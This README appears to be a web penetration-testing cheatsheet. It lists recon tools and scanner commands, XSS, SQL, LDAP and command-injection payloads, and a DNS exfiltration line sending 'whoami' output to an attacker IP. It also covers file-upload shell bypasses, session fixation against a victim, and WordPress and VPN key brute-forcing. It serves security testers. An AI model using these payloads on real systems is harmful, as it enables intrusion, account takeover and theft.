<!-- PROJECT LOGO -->
<br />
<p align="center">
    <img src="/img/hood.jpg" alt="Logo" width="400" height="350">

  <h3 align="center">Website Pentesting Cheatsheet</h3>

</p>


<b>Table of Contents</b>

- [Resources](#resources)
  * [API Auth](#api_auth_guide)

- [Passive Recon](#passiverecon)
  * [Bing](#bing)
  * [Censys](#censys)
  * [DnsDumpster](#dnsdumpster)
  * [FindSubdomains](#findsubdomains)
  * [ViewDNSinfo](#viewdnsinfo)
  * [TheHarvester](#theharvester)
  * [ArchiveOrg](#archiveorg)
  * [OSINT](#osint)


- [Initial scans](#initialscans)
  * [Nmap](#nmap)
  * [Sslscan](#sslscan)
  * [Testssl](#testssl)
  * [QualysSSL](#qualysSSL)
  * [SecurityHeaders](#securityheaders)
  * [CSP-Audit](#csp_google)

- [Website Audit](#pentesting)
  * [Nikto](#nikto)
  * [Wapiti](#wapiti)
  * [Dirbusting](#dirbusting)
  * [Burp](#burpsuite)
  * [XSS](#xss)
  * [XXE](#xxe)
  * [SQL injection](#sqlinjection)
  * [Command Injection](#commandinjection)
  * [CSRF](#csrf)
  * [SSRF](#ssrf)
  * [Directory Traversal](#directorytraversal)
  * [LFI](#localfileinclusion)
  * [File Inclusion](#fileinclusion)
  * [File Upload Bypass](#fileupload)
  * [Clickjacking](#clickjacking)
  * [Session fixation](#sessionfixation)
  * [Java Platform](#javaplatform)
  * [LDAP injection](#ldapinjection)
  * [CMS](#cms)
  
  
- [Misc - Other tests](#misc)
  * [Host Header Injection](#hostheaderinjection)
  * [Web Cache Poisoning](#webcachepoisoning)
  * [Open Redirect](#openredirect)
  * [WAF](#wafwoof)
  * [VPN](#vpn)
  * [API](#api)
 





---

<a name="resources"></a><h2> Resources </h2>

<a name="api_auth_guide"></a><h3>API Auth</h3>
- https://www.securitydrops.com/the-web-api-authentication-guide/

<a name="passiverecon"></a><h2> Passive Recon </h2>

<a name="bing"></a><h3>Bing</h3>
- Bing ->   ip:79.98.28.23

<a name="censys"></a><h3>Censys</h3>
- https://censys.io/

<a name="dnsdumpster"></a><h3>DnsDumpster</h3>
- https://dnsdumpster.com/

<a name="findsubdomains"></a><h3>FindSubdomains</h3>
- https://findsubdomains.com/

<a name="viewdnsinfo"></a><h3>View DNS Info</h3>
- https://viewdns.info/

<a name="theharvester"></a><h3>TheHarvester</h3>
```sh
 theharvester -d example.com -b all
```
<a name="archiveorg"></a><h3>ArchiveOrg</h3>
```sh
 curl -s "http://web.archive.org/cdx/search/cdx?url=something.example.com/*&output=text&fl=original&collapse=urlkey"
```
<a name="osint"></a><h3>OSINT</h3>
```
https://ginseg.com/2018/1416/congresos-cons/taller-sobre-ciberinteligencia-en-honeycon2018/
```

<a name="initialscans"></a><h2> Initial Scans </h2>

<a name="nmap"></a><h3>Nmap</h3>
```sh
- TCP:  grc nmap -sC -sV -vv -p- 10.10.10.120  -T5
- UDP:  grc nmap -sU -sV -vv -oA quick_udp 10.10.10.10
- VULN: grc nmap --script vuln IP
```
<a name="sslscan"></a><h3>Sslscan</h3>
```sh
 sslscan www.example.com
```
<a name="testssl"></a><h3>Testssl</h3>
```sh
 testssl www.example.com
```
<a name="qualysSSL"></a><h3>Qualys SSL Labs</h3>
- https://www.ssllabs.com/ssltest/

<a name="securityheaders"></a><h3>Security Headers</h3>
- https://securityheaders.com/

<a name="csp_google"></a><h3>CSP-Audit</h3>
- https://csp-evaluator.withgoogle.com/


<a name="pentesting"></a><h2> Website Audit </h2>

<a name="nikto"></a><h3>Nikto</h3>
```sh
 nikto -h www.example.com
```
```sh
# Nikto throught Burp suite
vim /etc/nikto.conf  -> LW_SSL_ENGINE=SSLeay
nikto -h www.domain.es:443 -useproxy http://127.0.0.1:8080/
```

<a name="wapiti"></a><h3>Wapiti</h3>
```sh
# Wapiti throught Burp suite
wapiti -u https://domain/ -p http://127.0.0.1:8080
```

<a name="dirbusting"></a><h3>Dirbusting</h3>

- Wfuzz
```sh
 wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://IP:PORT/FUZZ
```
```sh
wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt https://IP:PORT/FUZZ
```

- GoBuster
```sh
#Old gobuster
gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php
```

```sh
#New gobuster
gobuster dir -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 80 -x php,txt,html,htm
```

- IIS Scanner
```
https://github.com/irsdl/IIS-ShortName-Scanner
```

- .DS_Store
```
https://github.com/lijiejie/ds_store_exp
```

<a name="burpsuite"></a><h3>Burp Suite Professional</h3>

- Burpsuite pro
  - Recommended Extensions
    - .NET Beautifier
    - Active Scan++
    - Additional CSRF Checks
    - Additional Scanner Checks
    - Backslash Powered Scanner
    - CMS Scanner
    - Collaborator Everywhere
    - Command Injection Attacker
    - Content Type Converter
    - CSP Auditor
    - CSRF Scanner
    - Error Message Checks
    - Freddy, Deserialization Bug Finder
    - HTML5 Auditor
    - J2EEScan
    - Java Deserialization Bug Finder
    - JSON Beautifier
    - NGINX Alias Traversal
    - PHP Object Injection Check
    - Retire.js
    - Software version Reporter
    - Software Vulnerability Scanner

<a name="xss"></a><h3>XSS</h3>
```
[DOM] -> Inject in URL 
[STORED] -> Saved in the server, like a database
[REFLECTED] -> Returned in an error message, search result or any other response
```

```js
/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
<svg onload=alert('XSS')
"><script>alert(1)</script>
<script>alert(document.cookie);</script>
<script>alert(1)</script>
<script>alert("hello")</script>
<a onmouseover="alert(13)">xxs link</a>
<img src="a.jpg" onerror="javascript:alert(1)"/>
' onerror='alert(1)';
javascript:alert(1)
<body onload=alert("XSS")>
<img src=x onError=alert('xss')>
"><img src onerror=alert(1)> 
"autofocus onfocus=alert(1)// 
</script><script>alert(1)</script> 
'-alert(1)-' 
\'-alert(1)//

#DOM
blopblop</option></select><img src="" onerror="alert('lmao')">
German#<script>alert('LMAO')</script>


 1. " for ' and vice versa according to where injection lands 
 1. alert(1) for (confirm)(1) or confirm`1` 
 2. // for <!-- 
 3. spaces for / or %0A, %0C or %0D.


```

```sh
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
```

```
https://github.com/s0md3v/XSStrike
```

<a name="xxe"></a><h3>XXE</h3>
```
https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```

<a name="sqlinjection"></a><h3>SQL Injection</h3>


Detection of an SQL injection entry point
Simple characters

```sql
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
```

Multiple encoding

```sql
%%2727
%25%27
```

Merging characters

```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

Logic Testing

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

Weird characters

```sql
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

```
https://support.portswigger.net/customer/portal/articles/2791040-using-burp-with-sqlmap
```

<a name="commandinjection"></a><h3>Command Injection</h3>
```
https://www.owasp.org/index.php/Command_Injection
```

```
# Common injections
&&
|
;
```

```
# DNS exfiltration
Example:
Let's say we have a webpage with command injection vuln, we can exploit it using "&". 

	dnschef --fakeip=10.10.10.106 -i your_ip --logfile=exfil   [ Setup fake DNS server ]

	tail -f exfil | grep --line-buffered cooking | cut -d' ' -f11   [ Parse output file ]

Injection:   & nslookup this.is.a.test your_ip

If we see the "this.is.a.test" string in our fake DNS, the server is vulnerable.

Windows exfiltration:
	& for /f "usebackq tokens=1,2 delims=\" %i in (`whoami`) do nslookup %i_%j your_ip

```
<a name="csrf"></a><h3>CSRF</h3>
```
Example:  Do a petition with burp (logged in) , like adding a comment, send that petition to repeater and right click
'Engagement tools' > 'generate CSRF POC' , copy the link and open it. Then drop the petition you where going to do and log out.
Then in the link burp generated for you click "submit", log in again and check if the petition was made.
```

```
https://www.imperva.com/learn/application-security/csrf-cross-site-request-forgery/
```

```
https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)
```

```
https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-
```

<a name="ssrf"></a><h3>SSRF</h3>
```
https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
```

<a name="directorytraversal"></a><h3>Directory Traversal</h3>
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
```

<a name="localfileinclusion"></a><h3>LFI</h3>
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

```
https://github.com/P0cL4bs/Kadimus
```


<a name="fileinclusion"></a><h3>File Inclusion</h3>
```
http://192.168.1.34/vulnerabilities/fi/?page=C:\Users\Bryan\Desktop\prueba.txt

http://192.168.1.34/vulnerabilities/fi/?page=https://www.google.com

http://192.168.1.34/vulnerabilities/fi/?page=HTTPS://www.google.com

http://192.168.1.34/vulnerabilities/fi/?page=file:///E:\xampp\htdocs\prueba.txt
```


<a name="fileupload"></a><h3>File Upload Bypass</h3>
```
shell.png.png [ Intercep with burp and change to shell.php ]

shell.php [ Content-Type from octect/stream to image/jpeg ]

shell.php [ Content-Type to image/gif and start the file with GIF89a;]

shell.php5 shell.php4 ...

shell.PhP shell.phP shell.pht ...

shell.php;jpeg  [ , & | ]

shell.php/./././[...]

shell.php ... ......   [ Add spaces or dots ]

shell.php.sfdfwewfejpg

shell.php%001.jpg  or  shell.php\x00.jpg   [ Alternative: shell.phpD.jpg , RAW, 44 to 00 ]

../../../../logo.jpg  [ Maybe you can replace webpage images ]

```

```
# Allows .svg ? 

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

<a name="clickjacking"></a><h3>Clickjacking</h3>
```html
<html>
	<head>
		<title>Clickjack test page</title>
	</head>
	<body>
		<p>Website is vulnerable to clickjacking!</p>
		<iframe src="https://domain_to_test/" width="500" height="500"></iframe>
	</body>
</html
```

<a name="sessionfixation"></a><h3>Session Fixation</h3>
```
Example: 
We have an URL like this -> http://localhost:8080/bankLOLZ/?sessionID=34564KINIU2UV24U3V4QWDE33T
In the sessionID, we can try replacing numbers or letters ( We craft our own sessionID ) , we send the link
to the victim, the victim logs in using our crafted URL with our sessionID, once the victim logs in, we can use 
the same sessionID. We do a get petition with burp to some place in the web app, like this.
-> http://localhost:8080/bankLOLZ/accountManagement/victims_name

And we are in the web app using victim's account.
```

<a name="javaplatform"></a><h3>Java Platform</h3>

- https://github.com/joaomatosf/jexboss

```sh
python jexboss.py -u https://domain/index.action
```
<a name="javaplatform"></a><h3>Padding Oracle</h3>

- https://github.com/GDSSecurity/PadBuster

- https://github.com/mwielgoszewski/python-paddingoracle

<a name="ldapinjection"></a><h3>LDAP injection</h3>
```
-->  example.php?name=hacker&password=hacker
    
    Inversed querys give different results
--> example.php?name=*)(objectClass=*&password=hacker

--> example.php?name=*)(!(objectClass=*)&password=hacker
```

<a name="cms"></a><h3>CMS</h3>
- Wordpress
```
# Scan plugins and users
wpscan --url http://ip/wp/ -eu
```
```
# Bruteforce login
wpscan --url IP -U 'admin ' -P /usr/share/wordlists/rockyou.txt --max-threads 50
```

- Joomla
```
https://github.com/drego85/JoomlaScan
```
```
python joomlascan.py -u URL
```

- Drupal
```
https://github.com/droope/droopescan
```
```
./droopescan scan drupal -u http://example.org/ -t 32
```

- CMSmap
```
https://github.com/Dionach/CMSmap
```


<a name="misc"></a><h2> Misc - Other Tests </h2>
<a name="hostheaderinjection"></a><h3>Host header injection</h3>
```
Host: example.com -> Host: microsoft.com
```
```
Different web server behaves differently for duplicate http host header, NGINXuses last host header to identify the request, Apache/IIS concatenates.

Host: example.com
Host: microsoft.com
```
```
Host: example.com
X-Forwarded-Host: microsoft.com
```

<a name="webcachepoisoning"></a><h3>Web Cache Poisoning</h3>

```
https://portswigger.net/blog/practical-web-cache-poisoning
```


<a name="openredirect"></a><h3>Open Redirect</h3>

```
https://s0cket7.com/open-redirect-vulnerability/
```


<a name="wafwoof"></a><h3>wafw00f</h3>

```
wafw00f https://example.com
```


<a name="vpn"></a><h3>VPN</h3>

```
#  -M : Tabbed output    
#  -A : Aggressive mode    
#  -P<filename> : Filename to write to the pre-shared key   
#  -d : Destination UDP port

ike-scan -M -A IP -d 500 --id=blop -Pkey

# Crack key
psk-crack -d /usr/share/wordlists/rockyou.txt key
```


<a name="api"></a><h3>API</h3>

```
# JSON API, try to inject xml to archive XXE
https://blog.netspi.com/playing-content-type-xxe-json-endpoints/
```





